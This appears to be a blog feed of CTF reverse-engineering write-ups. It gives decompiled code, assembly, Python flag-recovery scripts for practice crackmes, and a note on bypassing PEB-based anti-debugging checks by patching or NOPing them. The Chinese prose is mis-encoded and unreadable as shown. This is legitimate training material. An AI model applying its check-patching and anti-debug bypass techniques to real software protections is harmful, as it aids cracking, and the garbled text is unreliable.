0x13, 0x05, 0x58, 0x56, 0x3E, 0x06, 0x0C, 0x3C, 0x1F, 0x57, 0x14, 0x6B, 0x57, 0x59, 0x0D]for _ in range(len(_403040)): flag += chr(_403040[_] ^ ord(_buffer[_]))print(flag) å¾—åˆ°flag&#123;d07abccf8a410c ç¼ºäº†äº”ä¸ªå­—ç¬¦ çœ‹å‡½æ•°finally 1234567891011121314151617int __cdecl finally(char *a1)&#123; unsigned int v1; // eax int result; // eax char v3[9]; // [esp+13h] [ebp-15h] BYREF int v4; // [esp+1Ch] [ebp-Ch] strcpy(v3, &quot;%tp&amp;:&quot;); v1 = time(0); srand(v1); v4 = rand() % 100; if ( (v3[*(_DWORD *)&amp;v3[5]] != a1[*(_DWORD *)&amp;v3[5]]) == v4 ) result = puts(&quot;Really??? Did you find it?OMG!!!&quot;); else result = puts(&quot;I hide the last part, you will not succeed!!!&quot;); return result;&#125; çœ‹ç€æœ‰ç‚¹å‘è’™, æ„Ÿè§‰ä¹Ÿæ²¡æœ‰åœ¨åšä»€ä¹ˆæ­£ç»çš„è¿ç®— v3çš„èµ‹å€¼ç®—æ˜¯ç»™äº†ä¸€ç‚¹ç‚¹æç¤ºå§ å¥‡å¥‡æ€ªæ€ªçš„è„‘æ´ 12hex(ord(&quot;:&quot;)^ord(&#x27;&#125;&#x27;))&#x27;0x47&#x27; 1234567#!/usr/bin/env python3key = 0x47flag = &quot;flag&#123;d07abccf8a410c&quot;v3 = &quot;%tp&amp;:&quot;for _ in v3: flag += chr(ord(_) ^ key)print(flag) flag{d07abccf8a410cb37a} equation é“¾æ¥: https://buuoj.cn/challenges#equation Javascript çœ‹ç€è¿™é“é¢˜è«ååœ°ä¼šæƒ³åˆ°â€œé«˜æ˜çš„é»‘å®¢â€ æ²¡å•¥å¥½è¯´çš„, ç›´æ¥æ”¾ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python3import reimport execjsraw = open(&quot;equation.html&quot;, &quot;r&quot;).read()data = re.findall(&quot;if\\((.*)\\)&quot;, raw)[0]data_list = data.split(&quot;&amp;&amp;&quot;)exp_sum = []res_sum = []for cnt in range(len(data_list)): test = data_list[cnt].split(&quot;==&quot;)[0] equ = data_list[cnt].split(&quot;==&quot;)[1] res = [int(execjs.eval(equ))] res_sum.append(res) symbol = [] if test.startswith(&quot;-&quot;): symbol.append(&quot;-&quot;) else: symbol.append(&quot;+&quot;) test = re.sub(&quot;\\]\\+l\\[&quot;, &quot; + &quot;, test) test = re.sub(&quot;\\]\\-l\\[&quot;, &quot; - &quot;, test) test = test.replace(&quot;l[&quot;, &quot;&quot;)[:-1] symbol_temp = re.findall(&quot; ([\\+\\-]) &quot;, test) for _ in symbol_temp: symbol.append(_) test = re.sub(&quot; [\\+\\-] &quot;, &quot; &quot;,test) jscode = test.split(&quot; &quot;) exp = [0 for _ in range(42)] for _ in range(len(jscode)): seq = int(execjs.eval(jscode[_])) if symbol[_] == &quot;+&quot;: exp[seq] = 1 elif symbol[_] == &quot;-&quot;: exp[seq] = -1 exp_sum.append(exp)b = Matrix(res_sum)x = Matrix(exp_sum)out = x.solve_right(b)flag = &quot;&quot;for _ in out: flag += chr(_[0])print(flag) execjs.eval()è¿è¡Œçš„é€Ÿåº¦å¥½æ…¢, ä¹Ÿæ‡’å¾—æ‰¾èƒ½å¤Ÿä»£æ›¿è¿™ä¸ªå‡½æ•°çš„å‡½æ•°äº† 100æ¬¡17s, 1638ä¸ªå­—ç¬¦ä¸², 5åˆ†é’Ÿå·¦å³ [FlareOn5]Ultimate Minesweeper é“¾æ¥: https://buuoj.cn/challenges#[FlareOn5]Ultimate Minesweeper .NET å…ˆæ”¾IDAé‡Œçœ‹çœ‹ çœ‹åˆ°å­—ç¬¦ä¸²&quot;Congratulations!&quot; æŸ¥çœ‹å¼•ç”¨è¿™ä¸ªå­—ç¬¦ä¸²çš„å‡½æ•°, ç„¶åç”¨dnspyçœ‹è¿™äº›å‡½æ•° MainForm::SquareRevealedCallback 12345678910111213141516171819202122// UltimateMinesweeper.MainForm// Token: 0x0600000C RID: 12 RVA: 0x00002348 File Offset: 0x00000548private void SquareRevealedCallback(uint column, uint row)&#123; if (this.MineField.BombRevealed) &#123; this.stopwatch.Stop(); Application.DoEvents(); Thread.Sleep(1000); new FailurePopup().ShowDialog(); Application.Exit(); &#125; this.RevealedCells.Add(row * MainForm.VALLOC_NODE_LIMIT + column); if (this.MineField.TotalUnrevealedEmptySquares == 0) &#123; this.stopwatch.Stop(); Application.DoEvents(); Thread.Sleep(1000); new SuccessPopup(this.GetKey(this.RevealedCells)).ShowDialog(); Application.Exit(); &#125;&#125; æŠŠåˆ¤æ–­å¤±è´¥çš„ä»£ç åˆ æ‰å†ä¿å­˜ç¨‹åº æ‰¾å‡ºä¸‰ä¸ªç‚¹å°±èƒ½å¤Ÿè¿›å…¥è¿‡å…³çš„é€»è¾‘ ä½†æ˜¯flagçš„å†…å®¹åº”è¯¥æ˜¯ä¸ç‚¹å‡»çš„æ ¼å­ç›¸å…³ è€Œä¸”ç‚¹çš„ä½ç½®ä¸æ˜¯éšæœºç”Ÿæˆçš„ è®°ä¸‹ä½ç½®å†ç©ä¸€éå°±èƒ½å¾—åˆ°flag flag{Ch3aters_Alw4ys_W1n@flare-on.com} [2019çº¢å¸½æ¯]childRE é“¾æ¥: https://buuoj.cn/challenges#[2019çº¢å¸½æ¯]childRE EXE 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v3; // rax __int64 v4; // rax const CHAR *v5; // r11 __int64 v6; // r10 int v7; // er9 const CHAR *v8; // r10 __int64 v9; // rcx __int64 v10; // rax int result; // eax unsigned int v12; // ecx __int64 v13; // r9 __int128 v14[2]; // [rsp+20h] [rbp-38h] BYREF v14[0] = 0i64; v14[1] = 0i64; sub_140001080(&quot;%s&quot;); v3 = -1i64; do ++v3; while ( *((_BYTE *)v14 + v3) ); if ( v3 != 31 ) &#123; while ( 1 ) Sleep(0x3E8u); &#125; v4 = sub_140001280(v14); v5 = name; if ( v4 ) &#123; sub_1400015C0(*(_QWORD *)(v4 + 8)); sub_1400015C0(*(_QWORD *)(v6 + 16)); v7 = dword_1400057E0; v5[dword_1400057E0] = *v8; dword_1400057E0 = v7 + 1; &#125; UnDecorateSymbolName(v5, outputString, 0x100u, 0); v9 = -1i64; do ++v9; while ( outputString[v9] ); if ( v9 == 62 ) &#123; v12 = 0; v13 = 0i64; do &#123; if ( a1234567890Qwer[outputString[v13] % 23] != *(_BYTE *)(v13 + 0x140003478i64) ) _exit(v12); if ( a1234567890Qwer[outputString[v13] / 23] != *(_BYTE *)(v13 + 0x140003438i64) ) _exit(v12 * v12); ++v12; ++v13; &#125; while ( v12 &lt; 0x3E ); sub_140001020(&quot;flag&#123;MD5(your input)&#125;\\n&quot;); result = 0; &#125; else &#123; v10 = sub_1400018A0(std::cout); std::ostream::operator&lt;&lt;(v10, sub_140001A60); result = -1; &#125; return result;&#125; 0x140003478i64å³ 1.rdata:0000000140003478 a46200860044218 db &#39;(_@4620!08!6_0*0442!@186%%0@3&#x3D;66!!974*3234&#x3D;&amp;0^3&amp;1@&#x3D;&amp;0908!6_0*&amp;&#39;,0 å…ˆè¿˜åŸå‡ºoutputString 123456789101112#!/usr/bin/env python3import hashlib_003478 = &quot;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;&quot;_003438 = &quot;55565653255552225565565555243466334653663544426565555525555222&quot;_0033A0 = &quot;1234567890-=!@#$%^&amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;&#x27;ASDFGHJKL:\\&quot;ZXCVBNM&lt;&gt;?zxcvbnm,./&quot;output = [0 for _ in _003478]for _ in range(len(_003478)): b = _0033A0.index(_003478[_]) a = _0033A0.index(_003438[_]) output[_] = chr(23 * a + b)cipher = &quot;&quot;.join(output)print(cipher) å¾—åˆ°ç»“æœå¦‚ä¸‹ 1private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)Traceback (most recent call last) ç„¶åæ˜¯C++åå­—ä¿®é¥° åœ¨ä¸€å—å®åœ¨æ²¡æ€ä¹ˆäº†è§£è¿‡ https://www.freesion.com/article/6515734088/ ä¸­é—´çš„å‡½æ•°è²Œä¼¼æœ‰æ›¿æ¢å­—ç¬¦ä¸²é¡ºåº æ–­ç‚¹ä¸‹åˆ°UnDecorateSymbolName(v5, outputString, 0x100u, 0);å°±èƒ½åœ¨å¯„å­˜å™¨çœ‹åˆ°æ›¿æ¢é¡ºåºä¹‹åå­—ç¬¦ä¸² 12345678910#!/usr/bin/env python3decorate = &quot;?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z&quot;seq1 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_&quot;seq2 = &quot;PQHRSIDTUJVWKEBXYLZ[MF\\\\]N^_OGCA&quot;cipher = [0 for _ in decorate]for _ in range(len(cipher)): cipher[_] = decorate[seq2.index(seq1[_])]print(&quot;&quot;.join(cipher))flag = &quot;flag&#123;&quot; + hashlib.md5(&quot;&quot;.join(cipher).encode()).hexdigest() + &quot;&#125;&quot;print(flag) flag{63b148e750fed3a33419168ac58083f5} [ACTFæ–°ç”Ÿèµ›2020]SoulLike é“¾æ¥: https://buuoj.cn/challenges#[ACTFæ–°ç”Ÿèµ›2020]SoulLike ELF 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940__int64 __fastcall main(int a1, char **a2, char **a3)&#123; __int64 result; // rax char v5; // [rsp+7h] [rbp-B9h] int i; // [rsp+8h] [rbp-B8h] int j; // [rsp+Ch] [rbp-B4h] int v8[14]; // [rsp+10h] [rbp-B0h] BYREF char v9[110]; // [rsp+4Ah] [rbp-76h] BYREF unsigned __int64 v10; // [rsp+B8h] [rbp-8h] v10 = __readfsqword(0x28u); printf(&quot;input flag:&quot;); scanf(&quot;%s&quot;, &amp;v9[6]); strcpy(v9, &quot;actf&#123;&quot;); v5 = 1; for ( i = 0; i &lt;= 4; ++i ) &#123; if ( v9[i] != v9[i + 6] ) &#123; v5 = 0; goto LABEL_6; &#125; &#125; if ( !v5 ) goto LABEL_16;LABEL_6: for ( j = 0; j &lt;= 11; ++j ) v8[j] = v9[j + 11]; if ( (unsigned __int8)sub_83A(v8) &amp;&amp; v9[23] == 125 ) &#123; printf(&quot;That&#x27;s true! flag is %s&quot;, &amp;v9[6]); result = 0LL; &#125; else &#123;LABEL_16: printf(&quot;Try another time...&quot;); result = 0LL; &#125; return result;&#125; å‡½æ•°sub_83Aä»£ç è¿‡é•¿ IDAæ— æ³•åç¼–è¯‘ éœ€è¦ä¿®æ”¹æ–‡ä»¶hexrays.cfg 1MAX_FUNCSIZE &#x3D; 64 &#x2F;&#x2F; Functions over 64K are not decompiled è¿™ä¸ªæ•°å€¼æ”¹å¤§ç‚¹å°±è¡Œ åç¼–è¯‘äº†sub_83Aå°±çŸ¥é“è¯¥å¹²å˜›äº† 12345678910111213141516#!/usr/bin/env python3import reimport osdata = open(&quot;data&quot;, &quot;r&quot;).read().replace(&quot; &quot;, &quot;&quot;).replace(&quot;u;&quot;, &quot;&quot;).replace(&quot;;&quot;, &quot;&quot;).replace(&quot;*a1&quot;, &quot;a1[0]&quot;)data = re.sub(&quot;\\+\\+(.*)&quot;, &quot;\\\\1 -= 1&quot;, data).split(&quot;\\n&quot;)write = open(&quot;data_re.py&quot;, &quot;w&quot;)write.write(&quot;a1 = [126, 50, 37, 88, 89, 107, 53, 110, 0, 19, 30, 56]\\n&quot;)for _ in data[::-1]: write.write(_+&quot;\\n&quot;)write.write(&quot;&quot;&quot;flag = &quot;flag&#123;&quot;for _ in a1: flag += chr(_)flag += &quot;&#125;&quot;print(flag)&quot;&quot;&quot;)write.close()os.system(&quot;python3 data_re.py&quot;) flag{b0Nf|Re_LiT!} [MRCTF2020]PixelShooter é“¾æ¥: https://buuoj.cn/challenges#[MRCTF2020]PixelShooter Android è²Œä¼¼æ˜¯ç”¨äº†U3D, æ”¹æˆzipè§£å‹, æ‰¾åˆ°Assembly-CSharp.dll åœ¨IDAé‡Œçœ‹å­—ç¬¦ä¸²å°±è¡Œ flag{Unity_1S_Fun_233} [å®‰æ´µæ¯ 2019]crackMe é“¾æ¥: https://buuoj.cn/challenges#[å®‰æ´µæ¯ 2019]crackMe EXE 32 IDAä¸­ _main_0 å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 1234567891011int __cdecl __noreturn main_0(int argc, const char **argv, const char **envp)&#123; int (__cdecl *v3)(_DWORD *); // [esp-4h] [ebp-D0h] printf(&quot;please Input the flag:\\n&quot;); scanf_s(&quot;%s&quot;, &amp;unk_41A1E4); MessageBoxW(0, L&quot;Exception&quot;, L&quot;Warning&quot;, 0); v3 = sub_41100F; MEMORY[0] = 1; sub_411136(HIWORD(v3));&#125; è¿è¡Œçš„æ—¶å€™å›å¼¹ä¸€ä¸ª&quot;hooked&quot;çš„çª—å£ åŠ¨è°ƒå‘ç°å‡½æ•°MessageBoxWè¢«hookåˆ°äº†sub_412AB0 12345678910111213141516171819int __stdcall sub_412AB0(int a1, int a2, int a3, int a4)&#123; size_t i; // [esp+D8h] [ebp-8h] for ( i = 0; i &lt; j_strlen(Str); ++i ) &#123; if ( Str[i] &lt;= 122 &amp;&amp; Str[i] &gt;= 97 ) &#123; Str[i] -= 32; &#125; else if ( Str[i] &lt;= 90 &amp;&amp; Str[i] &gt;= 65 ) &#123; Str[i] += 32; &#125; &#125; MessageBoxA(0, &quot;hooked&quot;, &quot;successed&quot;, 0); AddVectoredExceptionHandler(0, Handler); return 0;&#125; åšäº†ä¸€ä¸ªVEHçš„å¼‚å¸¸å¤„ç† 123456789101112int __stdcall Handler_0(_DWORD **a1)&#123; char v2[20]; // [esp+D0h] [ebp-18h] BYREF if ( **a1 == -1073741819 ) &#123; qmemcpy(v2, &quot;where_are_u_now?&quot;, 16); sub_411172(&amp;unk_41A218, v2); SetUnhandledExceptionFilter(TopLevelExceptionFilter); &#125; return 0;&#125; VEHå¼‚å¸¸å¤„ç†åˆå¥—äº†ä¸€ä¸ªSEHå¼‚å¸¸å¤„ç† è¿è¡Œå®Œå‡½æ•°sub_41100Fä¹‹å 1mov dword ptr [eax], 1 è¿™æ¡è¯­å¥ä¼šè§¦å‘å¼‚å¸¸ ä»è€Œè¿›å…¥VEHçš„å¼‚å¸¸å¤„ç†å‡½æ•° ç†ä¸€éé¡ºåº Base64è¡¨å†…å®¹å˜æ¢ å‡½æ•°sub_411172ä½¿ç”¨SM4åŠ å¯†è¾“å…¥å†…å®¹(æœä¸€ä¸‹0xA3B1BAC6) Str2é¡ºåºå˜æ¢ å‡½æ•°sub_4110FFå˜æ¢Base64è¡¨é¡ºåº Str2ä¸Base64ç¼–ç ç»“æœæ¯”è¾ƒ 1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python3import base64import binasciiimport pysm4cipher = &quot;1UTAOIkpyOSWGv/mOYFY4R!!&quot;cipher_list = [0 for _ in cipher ]for _ in range(0, len(cipher_list), 2): # æ¢ä½ cipher_list[_] = cipher[_+1] cipher_list[_+1] = cipher[_]cipher = &quot;&quot;.join(cipher_list).replace(&quot;!&quot;, &quot;&quot;)base64_table = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; base64_table_re = [0 for _ in base64_table]for _ in range(len(base64_table_re)): # æ¢Base64è¡¨ if 97 &lt;= ord(base64_table[(_+24)%64]) &lt;= 122: base64_table_re[_] = chr(ord(base64_table[(_+24)%64])-32) elif 65 &lt;= ord(base64_table[(_+24)%64]) &lt;= 90: base64_table_re[_] = chr(ord(base64_table[(_+24)%64])+32) else: base64_table_re[_] = base64_table[(_+24)%64]base64_table_re = &quot;&quot;.join(base64_table_re)cipher_list = [0 for _ in cipher]for _ in range(len(cipher)): # Base64æ¢è¡¨è§£ç  cipher_list[_] = base64_table[base64_table_re.index(cipher[_])]cipher = &quot;&quot;.join(cipher_list)cipher = base64.b64decode(cipher+&quot;==&quot;)key = b&quot;where_are_u_now?&quot; # SM4è§£å¯†flag = pysm4.decrypt(int(binascii.hexlify(cipher).decode(), 16), (int(binascii.hexlify(key).decode(), 16)))print(binascii.unhexlify(hex(flag)[2:].encode())) flag{SM4foRExcepioN?!} [FlareOn1]Bob Doge é“¾æ¥: https://buuoj.cn/challenges#[FlareOn1]Bob Doge EXE 64 ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªå®‰è£…ç¨‹åº å¾—åˆ°Challenge1.exe ä¸¢è¿›dnspy64 åœ¨å‡½æ•°btnDecode_Clické‡Œæ‰“æ–­ç‚¹çœ‹å­—ç¬¦ä¸² å¯ä»¥çœ‹åˆ°flag flag{3rmahg3rd.b0b.d0ge@flare-on.com} EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"}]},{"title":"Reverse_PEB","slug":"Reverse-PEB","date":"2021-05-24T23:13:45.000Z","updated":"2021-05-24T12:40:53.000Z","comments":true,"path":"2021/05/24/Reverse-PEB/","link":"","permalink":"https://yoloyolo.top/2021/05/24/Reverse-PEB/","excerpt":"https://buuoj.cn/challenges#crackMe å…³äºè¿™é“é¢˜ç›®çš„åè°ƒè¯•çŸ¥è¯†","text":"https://buuoj.cn/challenges#crackMe å…³äºè¿™é“é¢˜ç›®çš„åè°ƒè¯•çŸ¥è¯† PEBç»“æ„ä½“ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465+0x000 InheritedAddressSpace : UChar+0x001 ReadImageFileExecOptions : UChar+0x002 BeingDebugged : UChar+0x003 SpareBool : UChar+0x004 Mutant : Ptr32 Void+0x008 ImageBaseAddress : Ptr32 Void+0x00c Ldr : Ptr32 _PEB_LDR_DATA+0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS+0x014 SubSystemData : Ptr32 Void+0x018 ProcessHeap : Ptr32 Void+0x01c FastPebLock : Ptr32 _RTL_CRITICAL_SECTION+0x020 FastPebLockRoutine : Ptr32 Void+0x024 FastPebUnlockRoutine : Ptr32 Void+0x028 EnvironmentUpdateCount : Uint4B+0x02c KernelCallbackTable : Ptr32 Void+0x030 SystemReserved : [1] Uint4B+0x034 AtlThunkSListPtr32 : Uint4B+0x038 FreeList : Ptr32 _PEB_FREE_BLOCK+0x03c TlsExpansionCounter : Uint4B+0x040 TlsBitmap : Ptr32 Void+0x044 TlsBitmapBits : [2] Uint4B+0x04c ReadOnlySharedMemoryBase : Ptr32 Void+0x050 ReadOnlySharedMemoryHeap : Ptr32 Void+0x054 ReadOnlyStaticServerData : Ptr32 Ptr32 Void+0x058 AnsiCodePageData : Ptr32 Void+0x05c OemCodePageData : Ptr32 Void+0x060 UnicodeCaseTableData : Ptr32 Void+0x064 NumberOfProcessors : Uint4B+0x068 NtGlobalFlag : Uint4B+0x070 CriticalSectionTimeout : _LARGE_INTEGER+0x078 HeapSegmentReserve : Uint4B+0x07c HeapSegmentCommit : Uint4B+0x080 HeapDeCommitTotalFreeThreshold : Uint4B+0x084 HeapDeCommitFreeBlockThreshold : Uint4B+0x088 NumberOfHeaps : Uint4B+0x08c MaximumNumberOfHeaps : Uint4B+0x090 ProcessHeaps : Ptr32 Ptr32 Void+0x094 GdiSharedHandleTable : Ptr32 Void+0x098 ProcessStarterHelper : Ptr32 Void+0x09c GdiDCAttributeList : Uint4B+0x0a0 LoaderLock : Ptr32 Void+0x0a4 OSMajorVersion : Uint4B+0x0a8 OSMinorVersion : Uint4B+0x0ac OSBuildNumber : Uint2B+0x0ae OSCSDVersion : Uint2B+0x0b0 OSPlatformId : Uint4B+0x0b4 ImageSubsystem : Uint4B+0x0b8 ImageSubsystemMajorVersion : Uint4B+0x0bc ImageSubsystemMinorVersion : Uint4B+0x0c0 ImageProcessAffinityMask : Uint4B+0x0c4 GdiHandleBuffer : [34] Uint4B+0x14c PostProcessInitRoutine : Ptr32 void +0x150 TlsExpansionBitmap : Ptr32 Void+0x154 TlsExpansionBitmapBits : [32] Uint4B+0x1d4 SessionId : Uint4B+0x1d8 AppCompatFlags : _ULARGE_INTEGER+0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER_ULARGE_INTEGER+0x1e8 pShimData : Ptr32 Void+0x1ec AppCompatInfo : Ptr32 Void+0x1f0 CSDVersion : _UNICODE_STRING+0x1f8 ActivationContextData : Ptr32 Void+0x1fc ProcessAssemblyStorageMap : Ptr32 Void+0x200 SystemDefaultActivationContextData : Ptr32 Void+0x204 SystemAssemblyStorageMap : Ptr32 Void+0x208 MinimumStackCommit : Uint4B IDAä¸­åç¼–è¯‘çš„ç»“æœä»¥åŠå¯¹äºPEBç»“æ„ä½“çš„å®šä¹‰æè¿°ä¸çœŸå®æƒ…å†µæœ‰äº›å‡ºå…¥, éœ€è¦ä»¥æ±‡ç¼–ä»£ç ä¸ºå‡† 1if ( *((_DWORD *)NtCurrentPeb()-&gt;ProcessHeap + 0x0C) != 2 ) 12345.text:004015D4 mov eax, large fs:30h.text:004015DA mov eax, [eax+18h].text:004015DD mov eax, [eax+0Ch].text:004015E0 cmp eax, 2.text:004015E3 jz short loc_401628 1if ( *((_DWORD *)NtCurrentPeb()-&gt;ProcessHeap + 0x0C) != 2 ) 12345.text:00401985 mov eax, large fs:30h.text:0040198B mov eax, [eax+18h].text:0040198E mov eax, [eax+0Ch].text:00401991 cmp eax, 2.text:00401994 jz short loc_4019A2 HEAPç»“æ„ä½“ 123456789+0Ã—000 Entry :_HEAP_ENTRY+0Ã—008 Signature :Uint4B+0Ã—00c Flags :Uint4B+0Ã—010 ForceFlags :Uint4B+0Ã—014 VirtualMemoryThreshold :Uint4B+0Ã—018 SegmentReserve :Uint4B+0Ã—01c SegmentCommit :Uint4B+0Ã—020 DeCommitFreeBlockThreshold :Uint4B... 1if ( ((int)NtCurrentPeb()-&gt;NtGlobalFlag &amp; 0x70) != 0 ) 12345.text:00401ADA mov eax, large fs:30h.text:00401AE0 mov eax, [eax+68h].text:00401AE3 and eax, 70h.text:00401AE6 test eax, eax.text:00401AE8 jz short loc_401B00 1if ( (unsigned __int8)*(_DWORD *)&amp;NtCurrentPeb()-&gt;BeingDebugged ) 1234567.text:00401B4D mov eax, large fs:30h.text:00401B53 inc eax.text:00401B54 inc eax.text:00401B55 mov eax, [eax].text:00401B57 and eax, 0FFh.text:00401B5C test eax, eax.text:00401B5E jz short loc_401B6E å½“ç¨‹åºè¢«è°ƒè¯•æ—¶, ä»¥ä¸Šifè¯­å¥å‡å¯èƒ½æˆç«‹, ä»è€Œå¯¹ç¨‹åºçš„æµç¨‹äº§ç”Ÿå½±å“ æ‰€ä»¥åŸºæœ¬çœ‹åˆ°PEBå‡ºç°NOPå°±å®Œäº‹äº† ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹ Page.529","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"},{"name":"PEB","slug":"PEB","permalink":"https://yoloyolo.top/tags/PEB/"},{"name":"Anti-Debug","slug":"Anti-Debug","permalink":"https://yoloyolo.top/tags/Anti-Debug/"}]},{"title":"Reverse_2","slug":"Reverse-2","date":"2021-05-21T17:53:31.000Z","updated":"2021-06-08T12:34:59.000Z","comments":true,"path":"2021/05/21/Reverse-2/","link":"","permalink":"https://yoloyolo.top/2021/05/21/Reverse-2/","excerpt":"æ„Ÿè§‰é€†å‘è¶Šæ¥è¶Šæœ‰æ„æ€äº†","text":"æ„Ÿè§‰é€†å‘è¶Šæ¥è¶Šæœ‰æ„æ€äº† [GWCTF 2019]xxor é“¾æ¥: https://buuoj.cn/challenges#[GWCTF 2019]xxor ELF 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; signed int i; // [rsp+8h] [rbp-68h] signed int j; // [rsp+Ch] [rbp-64h] __int64 v6; // [rsp+10h] [rbp-60h] __int64 v7; // [rsp+18h] [rbp-58h] __int64 v8; // [rsp+20h] [rbp-50h] __int64 v9; // [rsp+28h] [rbp-48h] __int64 v10; // [rsp+30h] [rbp-40h] __int64 v11; // [rsp+40h] [rbp-30h] __int64 v12; // [rsp+48h] [rbp-28h] __int64 v13; // [rsp+50h] [rbp-20h] __int64 v14; // [rsp+58h] [rbp-18h] __int64 v15; // [rsp+60h] [rbp-10h] unsigned __int64 v16; // [rsp+68h] [rbp-8h] v16 = __readfsqword(0x28u); puts(&quot;Let us play a game?&quot;); puts(&quot;you have six chances to input&quot;); puts(&quot;Come on!&quot;); v6 = 0LL; v7 = 0LL; v8 = 0LL; v9 = 0LL; v10 = 0LL; for ( i = 0; i &lt;= 5; ++i ) &#123; printf(&quot;%s&quot;, &quot;input: &quot;, (unsigned int)i); __isoc99_scanf(&quot;%d&quot;, (char *)&amp;v6 + 4 * i); &#125; v11 = 0LL; v12 = 0LL; v13 = 0LL; v14 = 0LL; v15 = 0LL; for ( j = 0; j &lt;= 4; j += 2 ) &#123; dword_601078 = *((_DWORD *)&amp;v6 + j); dword_60107C = *((_DWORD *)&amp;v6 + j + 1); sub_400686(&amp;dword_601078, &amp;unk_601060); *((_DWORD *)&amp;v11 + j) = dword_601078; *((_DWORD *)&amp;v11 + j + 1) = dword_60107C; &#125; if ( (unsigned int)sub_400770(&amp;v11) != 1 ) &#123; puts(&quot;NO NO NO~ &quot;); exit(0); &#125; puts(&quot;Congratulation!\\n&quot;); puts(&quot;You seccess half\\n&quot;); puts(&quot;Do not forget to change input to hex and combine~\\n&quot;); puts(&quot;ByeBye&quot;); return 0LL;&#125; ç¬¬ä¸€ä¸ªforå¾ªç¯ç”¨äºè¾“å…¥ ç¬¬äºŒä¸ªforå¾ªç¯ç”¨äºåŠ å¯† å‡½æ•°sub_400770ç”¨äºæ ¡éªŒåŠ å¯†ç»“æœ 123456789101112131415161718192021signed __int64 __fastcall sub_400770(_DWORD *a1)&#123; signed __int64 result; // rax if ( a1[2] - a1[3] != 2225223423LL || a1[3] + a1[4] != 4201428739LL || a1[2] - a1[4] != 1121399208LL ) &#123; puts(&quot;Wrong!&quot;); result = 0LL; &#125; else if ( *a1 != -548868226 || a1[5] != -2064448480 || a1[1] != 550153460 ) &#123; puts(&quot;Wrong!&quot;); result = 0LL; &#125; else &#123; puts(&quot;good!&quot;); result = 1LL; &#125; return result;&#125; å¯ä»¥æ ¹æ®å·²çŸ¥æ¡ä»¶è¿˜åŸå‡ºåŠ å¯†çš„ç»“æœ 12345678910111213141516171819202122__int64 __fastcall sub_400686(unsigned int *a1, _DWORD *a2)&#123; __int64 result; // rax unsigned int v3; // [rsp+1Ch] [rbp-24h] unsigned int v4; // [rsp+20h] [rbp-20h] int v5; // [rsp+24h] [rbp-1Ch] unsigned int i; // [rsp+28h] [rbp-18h] v3 = *a1; v4 = a1[1]; v5 = 0; for ( i = 0; i &lt;= 0x3F; ++i ) &#123; v5 += 1166789954; v3 += (v4 + v5 + 11) ^ ((v4 &lt;&lt; 6) + *a2) ^ ((v4 &gt;&gt; 9) + a2[1]) ^ 0x20; v4 += (v3 + v5 + 20) ^ ((v3 &lt;&lt; 6) + a2[2]) ^ ((v3 &gt;&gt; 9) + a2[3]) ^ 0x10; &#125; *a1 = v3; result = v4; a1[1] = v4; return result;&#125; è¿™é‡Œunsigned int a1=&amp;dword_601078 ä¸¤è€…éƒ½æ˜¯å››å­—èŠ‚çš„æ•°æ® 12v3 = *a1;v4 = a1[1]; ç„¶è€Œè¿™ä¸¤å¥ä»£ç å°±å°†dword_601078å˜æˆäº†ä¸€ä¸ªæ•°ç»„ ä¸€å¼€å§‹æœ‰ç‚¹äº‘é‡Œé›¾é‡Œçš„ ä½†æ˜¯è§‚å¯Ÿdword_601078çš„text viewæ—¶ 1234.bss:0000000000601078 dword_601078 dd ? ; DATA XREF: main+E6â†‘w.bss:0000000000601078 ; main+103â†‘o ....bss:000000000060107C dword_60107C dd ? ; DATA XREF: main+F8â†‘w.bss:000000000060107C ; main+122â†‘r ä¾¿å¯ä»¥ç†è§£dword_601078[1]å°±æ˜¯dword_60107C å†™pythonè„šæœ¬æ—¶, ä¸ºäº†ä¿è¯ä¸Cè¯­è¨€ç›¸åŒçš„è¿è¡Œæ•ˆæœ, å˜é‡åœ¨è¿›è¡Œè®¡ç®—æ—¶éƒ½æœ€å¥½åŠ ä¸€ä¸ª&amp;0xffffffff ç½‘ä¸Šçœ‹åˆ°æœ‰ç”¨ctypeså†™çš„, ä½†æ˜¯æ„Ÿè§‰è°ƒç”¨èµ·æ¥å¥½éº»çƒ¦ 123456789101112131415161718192021222324252627#!/usr/bin/env python3import binasciicipher = [0xdf48ef7e, 0x20caacf4, 0, 0, 0, 0x84f30420, ]x1 = 0x84A236FFx2 = 0xFA6CB703x3 = 0x42D731A8cipher[2] = (x1+x2+x3)//2cipher[3] = (cipher[2] - x1)&amp;0xffffffffcipher[4] = (cipher[2] - x3)&amp;0xfffffffffor i in range(0, 5, 2): tmp = (0x458BCD42*64)&amp;0xffffffff for _ in range(64): cipher[i+1] = 